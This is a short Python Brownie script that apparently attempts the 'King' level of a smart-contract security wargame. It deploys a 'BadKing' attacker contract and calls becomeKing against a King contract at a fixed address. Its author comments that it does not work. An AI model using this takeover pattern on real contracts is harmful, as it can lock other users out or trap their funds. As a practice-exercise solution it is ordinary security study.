from brownie import King, BadKing, Contract
from scripts.helpful_scripts import *
from web3 import Web3

account = getAccount()

king = Contract.from_abi("King", "0x1562fdCabB4e8daFF5F3dDE341525c0438Bc3145", King.abi)


def main():
    badking = BadKing.deploy({"from": account, "value": Web3.toWei(0.0015, "ether")})
    # badking = BadKing[-1]
    tx = badking.becomeKing({"from": account})
    tx.wait(1)
    print(Web3.fromWei(king.prize(), "ether"))


# Well fuck this one. I've even looked up the answer but it doesn't want to work for some reason, on to
# the next one
